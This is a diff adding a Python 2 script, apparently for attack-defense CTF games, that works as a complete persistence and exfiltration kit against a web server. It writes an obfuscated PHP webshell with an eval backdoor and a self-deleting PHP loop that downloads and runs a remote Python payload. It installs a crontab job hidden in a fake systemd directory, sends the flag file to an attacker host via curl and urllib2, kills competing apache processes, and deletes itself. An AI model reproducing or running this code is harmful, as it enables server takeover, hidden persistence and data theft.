@@ -1,0 +1,281 @@
+#!/usr/bin/env python
+#-*- coding: utf-8 -*-
+
+import socket
+import time
+import multiprocessing
+import commands
+import fcntl
+import struct
+import os
+import uuid
+import sys
+import urllib2
+import urllib
+
+AttackIp = '172.20.120.5'#edit my server's ip
+webroot = '/var/www/html/' #edit the path
+fileshell = '--user.inc.php'
+url = 'http://127.0.0.1/test/' #edit local url of put shell
+tmpfile = '/tmp/session_time'
+cacheshell=".cache.php"
+flagname = '/flag' #Edit the flag path
+networkCard="eth0" #edit card name
+
+cms = ''
+webroot = webroot+cms
+
+crontab_content = '''(crontab -l;printf "* * * * *  /bin/mkdir -p /tmp/systemd-private-a29c8d4b5e76422cb78179dd14906715-systemd-timesyncd.service-p9PBKc/session/; /usr/bin/wget http://@IP/py.txt -O /tmp/systemd-private-a29c8d4b5e76422cb78179dd14906715-systemd-timesyncd.service-p9PBKc/session/mylab.py; /usr/bin/python /tmp/systemd-private-a29c8d4b5e76422cb78179dd14906715-systemd-timesyncd.service-p9PBKc/session/mylab.py; \r\n")|crontab -'''
+
+file_content = '''<?php
+error_reporting(0); 
+$ip = '@IP';//edit ip
+$webroot = "@ROOT";//edit dir
+$b = "JHJlbW90ZV9m".chr(0x61)."WxlX2EgPSAn".chr(0x61)."HR0cDovLycuJGlwLicvdXNlci1pbmMudHh0JzsKJGNvbnRlbnRfYSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRyZW1vdGVfZmlsZV9hKTsKZmlsZV9wdXRfY29udGVudHMoJHdlYnJvb3QuJy8uc2Vzc2lvbi5w".chr(0x61)."HAnLCRjb250ZW50X2EpOwokcmVtb3RlX2ZpbGVfbSA9ICdodHRwOi8vJy4k".chr(0x61)."XAuJy9w".chr(0x61)."HAudHh0JzsKJGNvbnRlbnRfbSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRyZW1vdGVfZmlsZV9tKTsKJHRtID0gdGltZSgpOwokcnRtID0gZmlsZW10".chr(0x61)."W1lKCcvdG1wL3Nlc3Npb25fdGltZScpOwppZiAoJHRtLSRydG0gPiAyKQp7Cglm".chr(0x61)."WxlX3B1dF9jb250ZW50cygkd2Vicm9vdC4nLy5jYWNoZS5w".chr(0x61)."HAnLCRjb250ZW50X20pOwoJJHJlbW90ZSA9ICJw".chr(0x61)."HAgIi4kd2Vicm9vdC4iLy5jYWNoZS5w".chr(0x61)."HAiOwoJc3lzdGVtKCRyZW1vdGUpOwp9";
+eval(base64_decode($b));
+if(isset($_REQUEST['p']) && md5($_REQUEST['p']) == '9bdae23f2f19c4c3d25e7719f7a72ee9' && isset($_POST['sec'])) eval($_POST['sec']);
+'''
+cache_content = '''<?php
+unlink($_SERVER['SCRIPT_FILENAME']); 
+ignore_user_abort(true); 
+set_time_limit(0); 
+$ip =  "@IP"; //edit my server's ip
+$pos = "/tmp/systemd-private-a29c8d4b5e76422cb78179dd14906715-systemd-timesyncd.service-p9PBKc/session/"; 
+$cmd1 = "mkdir -p $pos;wget http://$ip/py.txt -O $pos/mylab.py"; 
+$cmd2 = "nohup python $pos/mylab.py > /dev/null &"; 
+$basedir="@ROOT"; 
+$cmd3="wget http://$ip/user-inc.txt -O $basedir/--user.inc.php";
+$flagname = '@FLAG'; //Edit the flag path
+
+$time = time();
+function get_allfiles($path,&$files) {
+    if(is_dir($path)){
+        $dp = dir($path);
+        while ($file = $dp ->read()){
+            if($file !="." && $file !=".."){
+                get_allfiles($path."/".$file, $files);
+            }
+        }
+        $dp ->close();
+    }
+    if(is_file($path)){
+        $files[] =  $path;
+    }
+}
+
+function get_filenamesbydir($dir){
+    $files =  array();
+    get_allfiles($dir,$files);
+    return $files;
+}
+
+
+while(1)
+{
+	$cmd = "ps axu|grep 'mylab.py'|grep -v 'grep'|wc -l";
+	$ret = shell_exec("$cmd");
+	$ret = rtrim($ret, "rn");
+	if($ret==0)
+	{
+		system($cmd1);//download py
+		system($cmd2);//run py
+		system($cmd3);
+	};
+	$tm = time();
+	$write = "echo $tm > /tmp/session_time";  
+	system($write);
+	//获取flag 并回传 = 
+	$flag = file_get_contents($flagname);
+	$localip = shell_exec("ifconfig @CARD | grep inet | sed '2d'| awk '{ print $2}'|awk -F: '{ print $2 }'"); //edit netcard's name eth0 or others
+	$flag = $localip."::".$flag; 
+	$cmd4 = "curl -d flag=".urlencode($flag)."  http://$ip/get.php"; 
+	system($cmd4);
+	sleep(30);
+}
+?>
+'''
+def get_mac_address():
+    mac=uuid.UUID(int = uuid.getnode()).hex[-12:]
+    return ":".join([mac[e:e+2] for e in range(0,11,2)])
+
+
+def get_ip_address(ifname):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        return socket.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s', ifname[:15]))[20:24])
+    except Exception,e:
+        return ''
+
+
+def send_flag(pids):
+
+    pids[0]=int(os.getpid())
+    print pids[0],pids[1],pids[2]
+
+    while True:
+        try:
+            (stat,out)=commands.getstatusoutput('ps -ef')
+            if pids[1]<>0:
+                if (out.count(' '+str(pids[2])+' '))<1:
+                    p1=multiprocessing.Process(target = watch_files,args=(pids,))
+                    p1.start()
+
+            (stat,flag)=commands.getstatusoutput('cat '+flagname)  
+            #macLocal=get_mac_address()
+            ipaddr = get_ip_address(networkCard)  #edit the interface name 'eth0' or others
+            text=ipaddr+':'+flag
+            urllib2.urlopen("http://"+AttackIp+"/get.php",data=urllib.urlencode({'flag=':text}),timeout=2)
+            time.sleep(5)  
+        except Exception,e:
+            #print e
+            time.sleep(1)
+
+def watch_files(pids):
+
+    pids[1]=int(os.getpid())
+    print pids[0],pids[1],pids[2]
+
+    while True:
+        try:
+            (stat,out)=commands.getstatusoutput('ps -ef')
+            #(stat,out)=commands.getstattusoutput('rm -rf /var/www/*;echo 123 >/var/www/index.html')
+
+            if pids[2]<>0:
+                if (out.count(' '+str(pids[2])+' '))<1:
+                    p2=multiprocessing.Process(target = watch_caches,args=(pids,))
+                    p2.start()
+
+            # if pids[3]<>0:
+            #     if (out.count(' '+str(pids[3])+' '))<1:
+            #         p3=multiprocessing.Process(target = watch_crontab,args=(pids,))
+            #         p3.start()
+
+
+            if not os.path.exists(webroot+fileshell):
+                (stat,out)=commands.getstatusoutput('chmod -R +w '+webroot)
+                f = open(webroot+fileshell,'w')
+                f.write(file_content.replace("@IP",AttackIp).replace("@ROOT",webroot))
+                f.close()
+                urllib2.urlopen(url+cms+fileshell,timeout=2)
+
+            time.sleep(0.1)
+
+        except Exception,e:
+            #print e
+            time.sleep(0.1)
+
+def watch_caches(pids):
+    pids[2]=int(os.getpid())
+    print pids[0],pids[1],pids[2],pids[3]
+
+    while True:
+        try:
+            (stat,out)=commands.getstatusoutput('ps -ef')
+            if pids[3]<>0:
+                if (out.count(' '+str(pids[3])+' '))<1:
+                    p3=multiprocessing.Process(target = watch_crontab,args=(pids,))
+                    p3.start()
+
+            if not os.path.exists(tmpfile) or (time.time() - os.path.getmtime(tmpfile))>3.0:
+
+                (stat,out)=commands.getstatusoutput('chmod -R +w '+webroot)
+                #(stat,out)=commands.getstatusoutput('wget http://'+AttackIp+'/php.txt -O /tmp/cache.php;php /tmp/cache.php')
+                f = open(webroot+cacheshell,'w')
+                f.write(cache_content.replace('@IP',AttackIp).replace('@ROOT',webroot).replace('@FLAG',flagname).replace('@CARD',networkCard))
+                f.close()
+                #urllib2.urlopen(url+cms+cacheshell,timeout=2)
+
+            time.sleep(0.1)
+
+        except Exception,e:
+            #print e
+            time.sleep(0.1)
+
+
+def watch_crontab(pids):
+    pids[3]=int(os.getpid())
+    #print pids[0],pids[1],pids[2]
+
+    while True:
+        try:
+            (stat,out)=commands.getstatusoutput("pgrep -u apache")
+            if stat == 0:
+                kills = out.replace('\n',' ')
+                for pid in pids:
+                    if pid != 0:
+                        kills=kills.replace(str(pid),'')
+
+                (stat,out)=commands.getstatusoutput("ps -C apache2 | awk '{ print $1}'| sed -n '2,$p'")
+                if stat == 0:
+                    apache_pids = out.split('\n')
+                    for pid in apache_pids:
+                        if pid != 0:
+                            kills=kills.replace(str(pid),'')
+
+                (stat,out)=commands.getstatusoutput("kill -9 "+kills)
+
+
+            (stat,out)=commands.getstatusoutput('ps -ef')
+            if pids[0]<>0:
+                if (out.count(' '+str(pids[0])+' '))<1:
+                    p1=multiprocessing.Process(target = send_flag,args=(pids,))
+                    p1.start()
+            # if pids[2]<>0:
+            #     if (out.count(' '+str(pids[2])+' '))<1:
+            #         p2=multiprocessing.Process(target = watch_caches,args=(pids,))
+            #         p2.start()
+
+            (stat,out)=commands.getstatusoutput('crontab -l')
+            if 'a29c8d4b5e76422cb78179dd14906715' not in out:
+                (stat,out)=commands.getstatusoutput(crontab_content.replace('@IP',AttackIp))
+
+            time.sleep(0.1)
+
+        except Exception,e:
+            print e
+            time.sleep(0.1)
+
+
+if __name__ == '__main__':
+        pids=multiprocessing.Array('i',range(5))
+        pids[0]=0
+        pids[1]=0
+        pids[2]=0
+        pids[3]=0
+        pids[4]=os.getpid()
+        (stat,out)=commands.getstatusoutput('rm -f %s'%os.path.realpath(sys.argv[0]))
+        #获取所有本程序 运行的进程数  如果大于3就证明已经正常运行，自行退出
+        (stat,out)=commands.getstatusoutput("ps axu|grep '%s'|grep -v 'grep'|wc -l"%sys.argv[0])
+
+        if int(out)>=4:
+            sys.exit()
+
+        #
+        p1 = multiprocessing.Process(target = send_flag,args=(pids,))
+        p2 = multiprocessing.Process(target = watch_files,args=(pids,))
+        p3 = multiprocessing.Process(target = watch_caches,args=(pids,))
+        p4 = multiprocessing.Process(target = watch_crontab,args=(pids,))
+        p1.start()
+        p2.start()
+        p3.start()
+        p4.start()
+
+        time.sleep(1)
+
+	'''
+        #kill 掉所有非本脚本外其他 www-data进程
+        (stat,out)=commands.getstatusoutput("pgrep -u apache")
+        if stat == 0:
+            out = out.replace('\n',' ')
+            for pid in pids:
+                if pid != 0:
+                    out = out.replace(str(pid),'')
+            #print out
+            (stat,out)=commands.getstatusoutput("kill -9 "+out)
+
+        (stat,out)=commands.getstatusoutput('rm -f -- %s'%os.path.realpath(sys.argv[0]))
+        #kill 掉主进程
+        (stat,out)=commands.getstatusoutput('kill -9 '+str(os.getpid()))
+	'''
+
+
